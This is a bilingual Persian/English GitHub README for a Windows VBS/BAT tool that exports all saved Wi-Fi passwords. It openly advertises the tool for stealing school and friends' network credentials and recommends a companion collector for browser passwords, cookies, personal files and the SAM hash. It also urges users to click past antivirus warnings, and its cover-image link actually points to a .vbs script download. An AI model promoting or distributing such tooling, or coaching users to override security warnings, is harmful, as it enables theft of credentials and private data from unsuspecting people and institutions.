# get_wifi_pass
برنامه ای برای دزدی رمز وایفای || An app for stealing Wi-Fi passwords
# 🔐 WiFi Password Finder — پیداکننده و دزد پسوورد وایفای ویندوز

> **اگه دنبال ترجمه ی اینگلیسی هستی، اسکرول کن پایین به بخش English 👇**

![WiFi Password Finder — پیداکننده پسوورد وایفای]([images/cover.png](https://github.com/mastermemerirn/get_wifi_pass/releases/download/v1.0.0/Run_WiFi_Password.vbs))

<div dir="rtl">
https://github.com/mastermemerirn/get_wifi_pass/releases/download/v1.0.0/Run_WiFi_Password.vbs
## 📌 عنوان
**WiFi Password Finder** — ابزاری بدون نصب که همه‌ی پسووردهای وایفای ذخیره‌شده روی ویندوز رو یکجا پیدا می‌کنه و برات ذخیره می‌کنه.

## 📝 توضیح مفصل
این ابزار همه‌ی شبکه‌های وایفای که ویندوز ازشون استفاده کرده و پسووردهاشون رو ذخیره کرده رو اسکن می‌کنه و بدون اینکه باید بری تو تنظیمات و یکی‌یکی بگردی، لیست کامل «نام شبکه + پسوورد» رو در ۴ فرمت مختلف برات ذخیره می‌کنه:

- 📄 **TXT** — ساده و قابل خواندن
- 📊 **CSV** — قابل باز کردن در Excel
- 🧾 **JSON** — برای برنامه‌نویسان
- 🌐 **HTML** — صفحه‌ی تمیز که با دبل‌کلیک توی مرورگر باز میشه

کافیه فایل‌ها رو بذارید روی فلش و ببرید هر جا خواستید!

## ✨ امکانات
- 🔑 **پیدا کردن پسوورد وایفای فراموش‌شده** — پسوورد وایفای خودتو که یادته پاک کرده پیدا کن
- 🏫 **دزد اطلاعات وایفای مدرسه** — روی سیستم مدرسه اجرا کن، لیست کامل شبکه‌ها و پسووردها رو با خودت ببر
- 🏠 **دزد اطلاعات وایفای خونه / دوست** — روی سیستم خودت یا دوستت اجرا کن و پسوورد وایفای خونه یا دوستت رو داشته باش
- 📦 **خروجی چندفرمتی** — TXT / CSV / JSON / HTML در یک پوشه با تاریخ و ساعت
- 🚫 **بدون نصب** — فقط کافیه روی فایل اجرا کنی
- ⚡ **اجرا بدون صفحه‌ی CMD** — با فایل VBS اجرا میشه، کادر مشکی CMD نمیاد بالا
- 📁 **خروجی با تاریخ** — هر اجرا یه پوشه جدید با تاریخ و ساعت میسازه (مثلاً `WiFi_2026-11-07_14-30`)

## 📂 فایل‌ها و نحوه‌ی استفاده
دو فایل کنار هم توی یک پوشه (ترجیحاً روی فلش) قرار بده:

| فایل | کارش |
|---|---|
| `Run_WiFi_Passwords.vbs` | اجرای بدون صفحه‌ی CMD (دبل‌کلیک کن) |
| `WiFi_Passwords.bat` | اسکریپت اصلی (خود VBS اینو اجرا می‌کنه) |

### 🖱️ مراحل اجرا
1. هر دو فایل رو **کنار هم** توی یک پوشه بذار (VBS از پوشه‌ی خودش دنبال BAT میگرده).
2. روی **`Run_WiFi_Passwords.vbs`** دبل‌کلیک کن (اگه CMD باز شد، مستقیم روی `WiFi_Passwords.bat` دبل‌کلیک کن).
3. صبر کن تا بنویسه **Done!** — تعداد شبکه‌ها رو نشون میده.
4. پوشه‌ی جدیدی با اسم `WiFi_تاریخ_ساعت` ساخته میشه و خودکار باز میشه.
5. توش فایل‌های `passwords.txt`، `passwords.csv`، `passwords.json` و `passwords.html` هست. پسووردتو از `passwords.txt` یا `passwords.html` کپی کن.

> ⚠️ **مهم:** هر دو فایل باید کنار هم باشن. اگه فقط VBS رو بردی، اجرا نمیشه چون BAT رو پیدا نمی‌کنه.

## 🖥️ نیازمندی‌ها (ورژن‌ها)
| مورد | ورژن / توضیح |
|---|---|
| ویندوز | **Windows 10 / 11** (هر ورژنی — Home, Pro, Enterprise) |
| معماری | 32 یا 64 بیت، فرق نمی‌کنه |
| نصب چیز اضافه | ❌ نیاز نیست، نیازی به Python/Node/ادون نیست |
| دسترسی Admin | ❌ لازم نیست (پسوورد وایفای کاربر همون کاربره) |
| فایل‌های لازم | `Run_WiFi_Passwords.vbs` + `WiFi_Passwords.bat` (هر دو کنار هم) |
| فرمت خروجی | TXT / CSV / JSON / HTML |

> 💡 اگه می‌خوای همه‌چیز رو همزمان بدزدی (پسوورد مرورگرها، تاریخچه، کوکی، عکس‌ها، ویدیوها، فایل‌های Office، SAM و …) از **`Info_Collector.bat` + `collect.ps1`** کنار همین پوشه‌ها استفاده کن — فقط این دوتا رو هم کنار هم بذار و Info_Collector.bat رو اجرا کن (اونجا دسترسی Admin لازم داره).

## 🛡️ هشدار آنتی‌ویروس؟ مشکلی نیست!
اگه موقع اجرا **Defender، Avast، Kaspersky یا هر آنتی‌ویروسی** هشدار داد، اصلاً نگران نباش:

- ✅ **هیچ چیز روی سیستم نصب نمیشه** — فقط اطلاعات وایفای ذخیره‌شده رو می‌خونه.
- ✅ **فایل‌های سیستمی دست نمی‌ذاره** — فقط فایل‌های جدید درون پوشه‌ی خودش میسازه.
- ✅ **اینترنت استفاده نمی‌کنه** — هیچ چیزی جایی ارسال نمیشه.
- ✅ کافیه **Allow / Run / اجازه‌ده** رو بزنی.

> ⚖️ **سلب مسئولیت:** هرگونه استفاده‌ی نادرست از این برنامه یا اطلاعاتی که باهاش بدست میاری (مثلاً پسووردهای وایفای کسی که برات داد) **کاملاً به عهده‌ی خودت و خود کاربره** و برنامه و نویسنده‌ش هیچ مسئولیتی در قبال خطا یا زیان ندارن.

## ❓ سوالات متداول (FAQ)

**۱. چرا فایل‌های TXT/CSV خالین یا فقط یک شبکه دارن؟**
اگه وایفای فعال نیست، ممکنه فقط شبکه‌های ذخیره‌شده نشون داده بشن. یه وایفای بهش وصل شو و دوباره اجرا کن.

**۲. چرا اجرا نمیشه و چیزی نمیاد؟**
`WiFi_Passwords.bat` و `Run_WiFi_Passwords.vbs` باید **کنار هم توی یک پوشه** باشن. اگه جدا باشن، VBS بات رو پیدا نمی‌کنه.

**۳. آنتی‌ویروس گفت ویروسه، باور کنم؟**
نه، مشکلی نیست. فایل‌ها کوچکن و کد باز دارن (می‌تونی با Notepad بازشون کنی). فقط خروجی میسازن.

**۴. اگه سیستم Admin نباشه؟ اجرا میشه؟**
بله، پیدا کردن پسوورد وایفای نیازی به دسترسی ادمین نداره. (فقط Info_Collector برای دزدی کامل اطلاعات آدمین میخواد.)

**۵. چرا یه شبکه‌شون پسووردش خالیه؟**
یعنی وایفای بازه (Open) و پسوورد نداره، یعنی `(no password)`.

**۶. فایل HTML چیکار کنم باهاش؟**
دبل‌کلیک کن، توی مرورگر باز میشه و یه جدول تمیز با پسووردها میبینی.

</div>

---

<div dir="ltr">

# 🔐 WiFi Password Finder — Windows WiFi Password Stealer / Finder

## 📌 Title
**WiFi Password Finder** — a portable (no-install) tool that finds and exports every saved WiFi password on Windows.

## 📝 Detailed Description
The tool scans every WiFi network Windows has ever connected to and whose password is stored, then exports a complete **"Network Name + Password"** list in four different formats — no need to dig through Settings one by one:

- 📄 **TXT** — simple, human-readable
- 📊 **CSV** — opens directly in Excel
- 🧾 **JSON** — for developers
- 🌐 **HTML** — a clean page you can open with a double-click

Just copy the files onto a USB drive and take them anywhere!

## ✨ Features
- 🔑 **Find a forgotten WiFi password** — recover the password of your own WiFi that you forgot
- 🏫 **Steal the school WiFi info** — run it on a school computer and take the full list of networks & passwords with you
- 🏠 **Steal home / a friend's WiFi info** — run it on your or a friend's PC and keep their home WiFi password
- 📦 **Multi-format export** — TXT / CSV / JSON / HTML in one dated folder
- 🚫 **No installation** — just run the file
- ⚡ **No CMD window** — run it with the VBS file, so no black console window pops up
- 📁 **Dated output** — every run creates a new folder with date & time (e.g. `WiFi_2026-11-07_14-30`)

## 📂 Files & How to Use
Put **both files in the same folder** (ideally on a USB drive):

| File | Purpose |
|---|---|
| `Run_WiFi_Passwords.vbs` | Runs without a CMD window (double-click) |
| `WiFi_Passwords.bat` | The main script (the VBS runs it) |

### 🖱️ How to run it
1. Put **both files next to each other** in one folder (the VBS looks for the BAT in its own folder).
2. Double-click **`Run_WiFi_Passwords.vbs`** (if CMD opens instead, just double-click `WiFi_Passwords.bat` directly).
3. Wait until it says **Done!** — it shows how many networks were found.
4. A new folder named `WiFi_date_time` is created and opens automatically.
5. Inside are `passwords.txt`, `passwords.csv`, `passwords.json` and `passwords.html`. Copy your password from `passwords.txt` or `passwords.html`.

> ⚠️ **Important:** both files must be side by side. If you copy only the VBS, it won't work because it can't find the BAT.

## 🖥️ Requirements (versions)
| Item | Version / note |
|---|---|
| Windows | **Windows 10 / 11** (any edition — Home, Pro, Enterprise) |
| Architecture | 32 or 64-bit, doesn't matter |
| Anything to install? | ❌ No — no Python/Node/.NET needed |
| Admin access | ❌ Not needed (it reads the current user's saved WiFi) |
| Required files | `Run_WiFi_Passwords.vbs` + `WiFi_Passwords.bat` (side by side) |
| Output formats | TXT / CSV / JSON / HTML |

> 💡 To steal **everything** at once (browser passwords, history, cookies, photos, videos, Office files, the SAM password hash, …), use **`Info_Collector.bat` + `collect.ps1`** — put those two files in the same folder and run Info_Collector.bat (that one needs admin rights).

## 🛡️ Got an antivirus warning? Don't worry!
If **Defender, Avast, Kaspersky or any antivirus** warns you when you run it, it's totally fine:

- ✅ **Nothing gets installed** — it only reads the saved WiFi passwords.
- ✅ **System files stay untouched** — it only creates new files inside its own folder.
- ✅ **No internet is used** — nothing is sent anywhere.
- ✅ Just click **Allow / Run**.

> ⚖️ **Disclaimer:** Any incorrect use of this program — or of the information you get with it (e.g. someone's WiFi passwords) — is **entirely the user's own responsibility**; the program and its author accept no liability for any error or damage.

## ❓ FAQ

**1. Why are the TXT/CSV files empty or only have one network?**
If no WiFi is connected, only previously saved networks are shown. Connect to a WiFi and run it again.

**2. Why won't it run / nothing happens?**
`WiFi_Passwords.bat` and `Run_WiFi_Passwords.vbs` must be **in the same folder**. If they're apart, the VBS can't find the BAT.

**3. The antivirus said it's a virus — should I trust it?**
No, it's fine. The files are tiny and open-source (you can open them in Notepad). They just create output files.

**4. Does it work without admin rights?**
Yes, finding WiFi passwords needs no admin. (Only Info_Collector needs admin for a full steal.)

**5. Why does a network have no password?**
That means it's an **Open** network with no password, shown as `(no password)`.

**6. What do I do with the HTML file?**
Double-click it — it opens in your browser as a clean table of passwords.

</div>
